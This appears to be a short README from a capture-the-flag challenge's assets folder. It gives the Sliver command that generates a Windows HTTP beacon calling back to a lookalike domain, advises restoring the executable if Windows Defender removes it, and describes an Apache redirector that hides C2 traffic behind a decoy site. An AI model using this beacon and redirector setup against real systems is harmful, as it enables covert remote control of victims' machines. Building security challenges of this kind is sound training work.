# Assets
## Sliver beacon
The sliver beacon was generated with `sliver`'s `generate beacon --http reddid.com/c2assets -S 10 --os windows --jitter 0`.
If you don't see an EXE in this dir, it's likely removed by Windows Defender. Go ahead and restore it if needed.

## Redirector Apache2 site config
The redirector redirects non-beacon traffic to a decoy site, passes beacon traffic to the backing C2, and has an exception for the challenge's flag.